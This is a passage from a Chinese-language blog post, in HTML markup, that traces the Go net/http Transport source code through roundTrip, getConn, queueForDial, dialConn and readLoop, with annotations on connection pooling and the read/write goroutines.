class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; roundTrip implements a RoundTripper over HTTP.</span><br><span class="line">func (t *Transport) roundTrip(req *Request) (*Response, error) &#123;</span><br><span class="line">	t.nextProtoOnce.Do(t.onceSetNextProtoDefaults)</span><br><span class="line">	ctx :&#x3D; req.Context()</span><br><span class="line">	trace :&#x3D; httptrace.ContextClientTrace(ctx)</span><br><span class="line"></span><br><span class="line">	if req.URL &#x3D;&#x3D; nil &#123;</span><br><span class="line">		req.closeBody()</span><br><span class="line">		return nil, errors.New(&quot;http: nil Request.URL&quot;)</span><br><span class="line">	&#125;</span><br><span class="line">	if req.Header &#x3D;&#x3D; nil &#123;</span><br><span class="line">		req.closeBody()</span><br><span class="line">		return nil, errors.New(&quot;http: nil Request.Header&quot;)</span><br><span class="line">	&#125;</span><br><span class="line">	scheme :&#x3D; req.URL.Scheme</span><br><span class="line">	isHTTP :&#x3D; scheme &#x3D;&#x3D; &quot;http&quot; || scheme &#x3D;&#x3D; &quot;https&quot;</span><br><span class="line">	if isHTTP &#123;</span><br><span class="line">		for k, vv :&#x3D; range req.Header &#123;</span><br><span class="line">			if !httpguts.ValidHeaderFieldName(k) &#123;</span><br><span class="line">				return nil, fmt.Errorf(&quot;net&#x2F;http: invalid header field name %q&quot;, k)</span><br><span class="line">			&#125;</span><br><span class="line">			for _, v :&#x3D; range vv &#123;</span><br><span class="line">				if !httpguts.ValidHeaderFieldValue(v) &#123;</span><br><span class="line">		return nil, fmt.Errorf(&quot;net&#x2F;http: invalid header field value %q for key %v&quot;, v, k)</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if t.useRegisteredProtocol(req) &#123;</span><br><span class="line">		altProto, _ :&#x3D; t.altProto.Load().(map[string]RoundTripper)</span><br><span class="line">		if altRT :&#x3D; altProto[scheme]; altRT !&#x3D; nil &#123;</span><br><span class="line">			if resp, err :&#x3D; altRT.RoundTrip(req); err !&#x3D; ErrSkipAltProtocol &#123;</span><br><span class="line">				return resp, err</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if !isHTTP &#123;</span><br><span class="line">		req.closeBody()</span><br><span class="line">		return nil, &amp;badStringError&#123;&quot;unsupported protocol scheme&quot;, scheme&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if req.Method !&#x3D; &quot;&quot; &amp;&amp; !validMethod(req.Method) &#123;</span><br><span class="line">		return nil, fmt.Errorf(&quot;net&#x2F;http: invalid method %q&quot;, req.Method)</span><br><span class="line">	&#125;</span><br><span class="line">	if req.URL.Host &#x3D;&#x3D; &quot;&quot; &#123;</span><br><span class="line">		req.closeBody()</span><br><span class="line">		return nil, errors.New(&quot;http: no Host in request URL&quot;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for &#123;</span><br><span class="line">		select &#123;</span><br><span class="line">		case &lt;-ctx.Done():</span><br><span class="line">			req.closeBody()</span><br><span class="line">			return nil, ctx.Err()</span><br><span class="line">		default:</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; treq gets modified by roundTrip, so we need to recreate for each retry.</span><br><span class="line">		treq :&#x3D; &amp;transportRequest&#123;Request: req, trace: trace&#125;</span><br><span class="line">		cm, err :&#x3D; t.connectMethodForRequest(treq)</span><br><span class="line">		if err !&#x3D; nil &#123;</span><br><span class="line">			req.closeBody()</span><br><span class="line">			return nil, err</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Get the cached or newly-created connection to either the</span><br><span class="line">		&#x2F;&#x2F; host (for http or https), the http proxy, or the http proxy</span><br><span class="line">		&#x2F;&#x2F; pre-CONNECTed to https server. In any case, we&#39;ll be ready</span><br><span class="line">		&#x2F;&#x2F; to send it requests.</span><br><span class="line">		&#x2F;&#x2F;重点是这个函数getConn</span><br><span class="line">		pconn, err :&#x3D; t.getConn(treq, cm)</span><br><span class="line">		if err !&#x3D; nil &#123;</span><br><span class="line">			t.setReqCanceler(req, nil)</span><br><span class="line">			req.closeBody()</span><br><span class="line">			return nil, err</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		var resp *Response</span><br><span class="line">		if pconn.alt !&#x3D; nil &#123;</span><br><span class="line">			&#x2F;&#x2F; HTTP&#x2F;2 path.</span><br><span class="line">			t.setReqCanceler(req, nil) &#x2F;&#x2F; not cancelable with CancelRequest</span><br><span class="line">			resp, err &#x3D; pconn.alt.RoundTrip(req)</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			resp, err &#x3D; pconn.roundTrip(treq)</span><br><span class="line">		&#125;</span><br><span class="line">		if err &#x3D;&#x3D; nil &#123;</span><br><span class="line">			return resp, nil</span><br><span class="line">		&#125;</span><br><span class="line">		if http2isNoCachedConnError(err) &#123;</span><br><span class="line">			t.removeIdleConn(pconn)</span><br><span class="line">		&#125; else if !pconn.shouldRetryRequest(req, err) &#123;</span><br><span class="line">			&#x2F;&#x2F; Issue 16465: return underlying net.Conn.Read error from peek,</span><br><span class="line">			&#x2F;&#x2F; as we&#39;ve historically done.</span><br><span class="line">			if e, ok :&#x3D; err.(transportReadFromServerError); ok &#123;</span><br><span class="line">				err &#x3D; e.err</span><br><span class="line">			&#125;</span><br><span class="line">			return nil, err</span><br><span class="line">		&#125;</span><br><span class="line">		testHookRoundTripRetried()</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Rewind the body if we&#39;re able to.</span><br><span class="line">		if req.GetBody !&#x3D; nil &#123;</span><br><span class="line">			newReq :&#x3D; *req</span><br><span class="line">			var err error</span><br><span class="line">			newReq.Body, err &#x3D; req.GetBody()</span><br><span class="line">			if err !&#x3D; nil &#123;</span><br><span class="line">				return nil, err</span><br><span class="line">			&#125;</span><br><span class="line">			req &#x3D; &amp;newReq</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到主要是调用了getConn方法返回一个*persistConn类型的变量，继续跟进看看getConn是如何实现的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">func (t *Transport) getConn(treq *transportRequest, cm connectMethod) (pc *persistConn, err error) &#123;</span><br><span class="line">	req :&#x3D; treq.Request</span><br><span class="line">	trace :&#x3D; treq.trace</span><br><span class="line">	ctx :&#x3D; req.Context()</span><br><span class="line">	if trace !&#x3D; nil &amp;&amp; trace.GetConn !&#x3D; nil &#123;</span><br><span class="line">		trace.GetConn(cm.addr())</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	w :&#x3D; &amp;wantConn&#123;</span><br><span class="line">		cm:         cm,</span><br><span class="line">		key:        cm.key(),</span><br><span class="line">		ctx:        ctx,</span><br><span class="line">		ready:      make(chan struct&#123;&#125;, 1),</span><br><span class="line">		beforeDial: testHookPrePendingDial,</span><br><span class="line">		afterDial:  testHookPostPendingDial,</span><br><span class="line">	&#125;</span><br><span class="line">	defer func() &#123;</span><br><span class="line">		if err !&#x3D; nil &#123;</span><br><span class="line">			w.cancel(t, err)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line">	&#x2F;&#x2F;尝试去空闲的连接池中寻找</span><br><span class="line">	&#x2F;&#x2F;client针对每个host最多可以分别复用两个连接</span><br><span class="line">	&#x2F;&#x2F; Queue for idle connection.</span><br><span class="line">	if delivered :&#x3D; t.queueForIdleConn(w); delivered &#123;</span><br><span class="line">		pc :&#x3D; w.pc</span><br><span class="line">		if trace !&#x3D; nil &amp;&amp; trace.GotConn !&#x3D; nil &#123;</span><br><span class="line">			trace.GotConn(pc.gotIdleConnTrace(pc.idleAt))</span><br><span class="line">		&#125;</span><br><span class="line">		&#x2F;&#x2F; set request canceler to some non-nil function so we</span><br><span class="line">		&#x2F;&#x2F; can detect whether it was cleared between now and when</span><br><span class="line">		&#x2F;&#x2F; we enter roundTrip</span><br><span class="line">		t.setReqCanceler(req, func(error) &#123;&#125;)</span><br><span class="line">		return pc, nil</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cancelc :&#x3D; make(chan error, 1)</span><br><span class="line">	t.setReqCanceler(req, func(err error) &#123; cancelc &lt;- err &#125;)</span><br><span class="line">	&#x2F;&#x2F;当没有在连接池中找到可用连接时，新建一个</span><br><span class="line">	&#x2F;&#x2F; Queue for permission to dial.</span><br><span class="line">	t.queueForDial(w)</span><br><span class="line">       &#x2F;&#x2F; Wait for completion or cancellation.</span><br><span class="line">	select &#123;</span><br><span class="line">	case &lt;-w.ready:</span><br><span class="line">		&#x2F;&#x2F; Trace success but only for HTTP&#x2F;1.</span><br><span class="line">		&#x2F;&#x2F; HTTP&#x2F;2 calls trace.GotConn itself.</span><br><span class="line">	if w.pc !&#x3D; nil &amp;&amp; w.pc.alt &#x3D;&#x3D; nil &amp;&amp; trace !&#x3D; nil &amp;&amp; trace.GotConn !&#x3D; nil &#123;</span><br><span class="line">		trace.GotConn(httptrace.GotConnInfo&#123;Conn: w.pc.conn, Reused: w.pc.isReused()&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">		if w.err !&#x3D; nil &#123;</span><br><span class="line">			&#x2F;&#x2F; If the request has been cancelled, that&#39;s probably</span><br><span class="line">			&#x2F;&#x2F; what caused w.err; if so, prefer to return the</span><br><span class="line">			&#x2F;&#x2F; cancellation error (see golang.org&#x2F;issue&#x2F;16049).</span><br><span class="line">			select &#123;</span><br><span class="line">			case &lt;-req.Cancel:</span><br><span class="line">				return nil, errRequestCanceledConn</span><br><span class="line">			case &lt;-req.Context().Done():</span><br><span class="line">				return nil, req.Context().Err()</span><br><span class="line">			case err :&#x3D; &lt;-cancelc:</span><br><span class="line">				if err &#x3D;&#x3D; errRequestCanceled &#123;</span><br><span class="line">					err &#x3D; errRequestCanceledConn</span><br><span class="line">				&#125;</span><br><span class="line">				return nil, err</span><br><span class="line">			default:</span><br><span class="line">				&#x2F;&#x2F; return below</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return w.pc, w.err</span><br><span class="line">	case &lt;-req.Cancel:</span><br><span class="line">		return nil, errRequestCanceledConn</span><br><span class="line">	case &lt;-req.Context().Done():</span><br><span class="line">		return nil, req.Context().Err()</span><br><span class="line">	case err :&#x3D; &lt;-cancelc:</span><br><span class="line">		if err &#x3D;&#x3D; errRequestCanceled &#123;</span><br><span class="line">			err &#x3D; errRequestCanceledConn</span><br><span class="line">		&#125;</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>当我们新建连接时，若没有在Client结构体所维护的连接池中找到可用的连接，那么就调用queueForDial方法，这里需要注意，当Transport没有设置MaxIdleConnsPerHost这个值的情况下，client针对每个不同的host所能维持的connection默认值为2。</p>
-<p>接下来看看queueForDial方法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">func (t *Transport) queueForDial(w *wantConn) &#123;</span><br><span class="line">	w.beforeDial()</span><br><span class="line">	if t.MaxConnsPerHost &lt;&#x3D; 0 &#123;</span><br><span class="line">		go t.dialConnFor(w)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	t.connsPerHostMu.Lock()</span><br><span class="line">	defer t.connsPerHostMu.Unlock()</span><br><span class="line"></span><br><span class="line">	if n :&#x3D; t.connsPerHost[w.key]; n &lt; t.MaxConnsPerHost &#123;</span><br><span class="line">		if t.connsPerHost &#x3D;&#x3D; nil &#123;</span><br><span class="line">			t.connsPerHost &#x3D; make(map[connectMethodKey]int)</span><br><span class="line">		&#125;</span><br><span class="line">		t.connsPerHost[w.key] &#x3D; n + 1</span><br><span class="line">		go t.dialConnFor(w)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if t.connsPerHostWait &#x3D;&#x3D; nil &#123;</span><br><span class="line">		t.connsPerHostWait &#x3D; make(map[connectMethodKey]wantConnQueue)</span><br><span class="line">	&#125;</span><br><span class="line">	q :&#x3D; t.connsPerHostWait[w.key]</span><br><span class="line">	q.cleanFront()</span><br><span class="line">	q.pushBack(w)</span><br><span class="line">	t.connsPerHostWait[w.key] &#x3D; q</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>跟进dialConnFor方法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">func (t *Transport) dialConnFor(w *wantConn) &#123;</span><br><span class="line">	defer w.afterDial()</span><br><span class="line"></span><br><span class="line">	pc, err :&#x3D; t.dialConn(w.ctx, w.cm)</span><br><span class="line">	delivered :&#x3D; w.tryDeliver(pc, err)</span><br><span class="line">	if err &#x3D;&#x3D; nil &amp;&amp; (!delivered || pc.alt !&#x3D; nil) &#123;</span><br><span class="line">		&#x2F;&#x2F; pconn was not passed to w,</span><br><span class="line">		&#x2F;&#x2F; or it is HTTP&#x2F;2 and can be shared.</span><br><span class="line">		&#x2F;&#x2F; Add to the idle connection pool.</span><br><span class="line">		t.putOrCloseIdleConn(pc)</span><br><span class="line">	&#125;</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		t.decConnsPerHost(w.key)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>继续跟dialConn方法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">func (t *Transport) dialConn(ctx context.Context, cm connectMethod) (pconn *persistConn, err error) &#123;</span><br><span class="line">	&#x2F;&#x2F; 生成一个*persistConn对象</span><br><span class="line">	pconn &#x3D; &amp;persistConn&#123;</span><br><span class="line">		t:             t,</span><br><span class="line">		cacheKey:      cm.key(),</span><br><span class="line">		reqch:         make(chan requestAndChan, 1),</span><br><span class="line">		writech:       make(chan writeRequest, 1),</span><br><span class="line">		closech:       make(chan struct&#123;&#125;),</span><br><span class="line">		writeErrCh:    make(chan error, 1),</span><br><span class="line">		writeLoopDone: make(chan struct&#123;&#125;),</span><br><span class="line">	&#125;</span><br><span class="line">	trace :&#x3D; httptrace.ContextClientTrace(ctx)</span><br><span class="line">	wrapErr :&#x3D; func(err error) error &#123;</span><br><span class="line">		if cm.proxyURL !&#x3D; nil &#123;</span><br><span class="line">			&#x2F;&#x2F; Return a typed error, per Issue 16997</span><br><span class="line">			return &amp;net.OpError&#123;Op: &quot;proxyconnect&quot;, Net: &quot;tcp&quot;, Err: err&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return err</span><br><span class="line">	&#125;</span><br><span class="line">	&#x2F;&#x2F;下面是连接代码</span><br><span class="line">	if cm.scheme() &#x3D;&#x3D; &quot;https&quot; &amp;&amp; t.DialTLS !&#x3D; nil &#123;</span><br><span class="line">		var err error</span><br><span class="line">		pconn.conn, err &#x3D; t.DialTLS(&quot;tcp&quot;, cm.addr())</span><br><span class="line">		if err !&#x3D; nil &#123;</span><br><span class="line">			return nil, wrapErr(err)</span><br><span class="line">		&#125;</span><br><span class="line">		if pconn.conn &#x3D;&#x3D; nil &#123;</span><br><span class="line">		return nil, wrapErr(errors.New(&quot;net&#x2F;http: Transport.DialTLS returned (nil, nil)&quot;))</span><br><span class="line">		&#125;</span><br><span class="line">		if tc, ok :&#x3D; pconn.conn.(*tls.Conn); ok &#123;</span><br><span class="line">			&#x2F;&#x2F; Handshake here, in case DialTLS didn&#39;t. TLSNextProto below</span><br><span class="line">			&#x2F;&#x2F; depends on it for knowing the connection state.</span><br><span class="line">			if trace !&#x3D; nil &amp;&amp; trace.TLSHandshakeStart !&#x3D; nil &#123;</span><br><span class="line">				trace.TLSHandshakeStart()</span><br><span class="line">			&#125;</span><br><span class="line">			if err :&#x3D; tc.Handshake(); err !&#x3D; nil &#123;</span><br><span class="line">				go pconn.conn.Close()</span><br><span class="line">				if trace !&#x3D; nil &amp;&amp; trace.TLSHandshakeDone !&#x3D; nil &#123;</span><br><span class="line">					trace.TLSHandshakeDone(tls.ConnectionState&#123;&#125;, err)</span><br><span class="line">				&#125;</span><br><span class="line">				return nil, err</span><br><span class="line">			&#125;</span><br><span class="line">			cs :&#x3D; tc.ConnectionState()</span><br><span class="line">			if trace !&#x3D; nil &amp;&amp; trace.TLSHandshakeDone !&#x3D; nil &#123;</span><br><span class="line">				trace.TLSHandshakeDone(cs, nil)</span><br><span class="line">			&#125;</span><br><span class="line">			pconn.tlsState &#x3D; &amp;cs</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		conn, err :&#x3D; t.dial(ctx, &quot;tcp&quot;, cm.addr())</span><br><span class="line">		if err !&#x3D; nil &#123;</span><br><span class="line">			return nil, wrapErr(err)</span><br><span class="line">		&#125;</span><br><span class="line">		pconn.conn &#x3D; conn</span><br><span class="line">		if cm.scheme() &#x3D;&#x3D; &quot;https&quot; &#123;</span><br><span class="line">			var firstTLSHost string</span><br><span class="line">			if firstTLSHost, _, err &#x3D; net.SplitHostPort(cm.addr()); err !&#x3D; nil &#123;</span><br><span class="line">				return nil, wrapErr(err)</span><br><span class="line">			&#125;</span><br><span class="line">			if err &#x3D; pconn.addTLS(firstTLSHost, trace); err !&#x3D; nil &#123;</span><br><span class="line">				return nil, wrapErr(err)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	&#x2F;&#x2F;省略一部分不重要的代码</span><br><span class="line">        &#x2F;&#x2F;重点来了</span><br><span class="line">	pconn.br &#x3D; bufio.NewReaderSize(pconn, t.readBufferSize())</span><br><span class="line">	pconn.bw &#x3D; bufio.NewWriterSize(persistConnWriter&#123;pconn&#125;, t.writeBufferSize())</span><br><span class="line">	&#x2F;&#x2F;起了俩goroutine，一个负责在conn上读，一个负责写</span><br><span class="line">	go pconn.readLoop()</span><br><span class="line">	go pconn.writeLoop()</span><br><span class="line">	return pconn, nil</span><br></pre></td></tr></table></figure>
-
-<p>兜兜绕绕终于来到了关键的地方，在connection成功建立之后，可以看见启动了两个goroutine来负责读写<br>我们挑readloop来看看：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line">func (pc *persistConn) readLoop() &#123;</span><br><span class="line">	closeErr :&#x3D; errReadLoopExiting &#x2F;&#x2F; default value, if not changed below</span><br><span class="line">	defer func() &#123;</span><br><span class="line">		pc.close(closeErr)</span><br><span class="line">		pc.t.removeIdleConn(pc)</span><br><span class="line">	&#125;()</span><br><span class="line">	tryPutIdleConn :&#x3D; func(trace *httptrace.ClientTrace) bool &#123;</span><br><span class="line">		if err :&#x3D; pc.t.tryPutIdleConn(pc); err !&#x3D; nil &#123;</span><br><span class="line">			closeErr &#x3D; err</span><br><span class="line">			if trace !&#x3D; nil &amp;&amp; trace.PutIdleConn !&#x3D; nil &amp;&amp; err !&#x3D; errKeepAlivesDisabled &#123;</span><br><span class="line">				trace.PutIdleConn(err)</span><br><span class="line">			&#125;</span><br><span class="line">			return false</span><br><span class="line">		&#125;</span><br><span class="line">		if trace !&#x3D; nil &amp;&amp; trace.PutIdleConn !&#x3D; nil &#123;</span><br><span class="line">			trace.PutIdleConn(nil)</span><br><span class="line">		&#125;</span><br><span class="line">		return true</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; eofc is used to block caller goroutines reading from Response.Body</span><br><span class="line">	&#x2F;&#x2F; at EOF until this goroutines has (potentially) added the connection</span><br><span class="line">	&#x2F;&#x2F; back to the idle pool.</span><br><span class="line">	eofc :&#x3D; make(chan struct&#123;&#125;)</span><br><span class="line">	defer close(eofc) &#x2F;&#x2F; unblock reader on errors</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Read this once, before loop starts. (to avoid races in tests)</span><br><span class="line">	testHookMu.Lock()</span><br><span class="line">	testHookReadLoopBeforeNextRead :&#x3D; testHookReadLoopBeforeNextRead</span><br><span class="line">	testHookMu.Unlock()</span><br><span class="line"></span><br><span class="line">	alive :&#x3D; true</span><br><span class="line">	for alive &#123;</span><br><span class="line">	pc.readLimit &#x3D; pc.maxHeaderResponseSize()</span><br><span class="line">		_, err :&#x3D; pc.br.Peek(1)</span><br><span class="line"></span><br><span class="line">		pc.mu.Lock()</span><br><span class="line">		if pc.numExpectedResponses &#x3D;&#x3D; 0 &#123;</span><br><span class="line">			pc.readLoopPeekFailLocked(err)</span><br><span class="line">			pc.mu.Unlock()</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line">		pc.mu.Unlock()</span><br><span class="line"></span><br><span class="line">		rc :&#x3D; &lt;-pc.reqch</span><br><span class="line">		trace :&#x3D; httptrace.ContextClientTrace(rc.req.Context())</span><br><span class="line"></span><br><span class="line">		var resp *Response</span><br><span class="line">		if err &#x3D;&#x3D; nil &#123;</span><br><span class="line">			resp, err &#x3D; pc.readResponse(rc, trace) &#x2F;&#x2F;从connection中读response</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			err &#x3D; transportReadFromServerError&#123;err&#125;</span><br><span class="line">			closeErr &#x3D; err</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if err !&#x3D; nil &#123;</span><br><span class="line">			if pc.readLimit &lt;&#x3D; 0 &#123;</span><br><span class="line">				err &#x3D; 